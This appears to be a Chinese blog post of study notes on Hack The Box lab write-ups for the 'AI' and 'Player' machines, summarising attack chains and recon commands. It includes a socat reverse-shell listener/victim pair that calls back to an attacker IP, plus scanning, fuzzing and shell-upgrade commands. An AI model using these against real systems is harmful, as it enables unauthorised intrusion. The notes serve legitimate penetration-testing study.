---
layout: post
title: 《Write-ups for 0xrick's hack-the-box》学习备忘录
description: ""
keywords: ""
---

Paper：[Write-ups for 0xrick's hack-the-box](https://0xrick.github.io/categories/hack-the-box/)

### 一、AI

环境概述：Linux、Medium、30'、09 Nov 2019

渗透流程：Nmap -> Web Enumeration -> SQL injection –> Alexa’s Credentials –> SSH as Alexa –> User Flag -> JDWP –> Code Execution –> Root Shell –> Root Flag

知识点：

- 目录枚举：使用gobuster，`gobuster dir -u http://ai.htb/ -w /usr/share/wordlists/dirb/common.txt -x php`
- 文字转MP3：[https://ttsmp3.com](https://ttsmp3.com)，有中国女声，可读中文。
- MP3转WAV：使用ffmpeg，`ffmpeg -i test.mp3 test.wav`。
- Linux提权：使用`ps aux`查看root权限起的服务，使用`netstat -ntlp`查看敏感端口；在Github上使用关键词搜索exp。

思考：

- Nmap：-sC等价为--script=default，并无存在意义。
- 目录枚举：除了gobuster，还有dirb、dirsearch、wfuzz等工具。wfuzz是web模糊处理工具，类似于Burpsuite的intruder功能。
- SQL注入：通过语音识别用户上传的wav文件，执行并输出结果。场景很新颖，hard CTF-style。
- Linux提权：发现Apache Tomcat服务，作者首先确定了此服务无利用价值后，进而深入研究了其Tomcat jdwp服务。

### 二、Player

环境概述：Linux、Hard、40'、06 Jul 2019

渗透流程：Nmap -> Web Enumeration -> FFmpeg HLS Vulnerability –> Arbitrary File Read -> Command Injection –> User Flag -> Credentials in fix.php –> RCE –> Shell as www-data -> Root Flag

知识点：

- 子域名枚举：使用wfuzz，`wfuzz --hc 403 -c -w subdomains-top1mil-5000.txt -H "HOST: FUZZ.player.htb" http://10.10.10.145`。
- 文件泄露：`.swp`, `.bak` and `~`。
- 端口扫描：使用masscan，`masscan -p1-65535 10.10.10.145 --rate=1000 -e tun0`。
- Banner头泄露：通过使用nc，`nc ip port`可查看相应服务泄露的banner头，如SSH可看到版本。
- TTY伪终端：使用python，`python -c "import pty;pty.spawn('/bin/bash')"`。

思考：

- 重定向：渗透过程中将Burpsuite或ZAP打开，便于查看请求历史，避免漏掉重定向前的请求应答页面。
- 源码泄露：`.xxx.php.swp`文件是异常退出vi/vim编辑器时产生的文件，使用`vi/vim -r xxx`恢复，除此之外，还有`.xxx.php.swo`、`.xxx.php.swn`等以sw+最后一个字母依次递增的后缀文件，各种编辑器异常退出产生的文件后缀不唯一。
- TTY交互式终端：使用socat，```#Listener: socat file:`tty`,raw,echo=0 tcp-listen:4444 #Victim: socat exec:`bash -li`,pty,stderr,setsid,sigint,sane tcp:1xx.xxx.xxx.xxx:4444```。
- Linux提权：只要是以root权限运行的服务，都要逐一排查。如果是PHP、Python等启动的程序，要进行代码审计，重点发现文件包含、命令执行漏洞，寻找输入点，并借此进程获取root。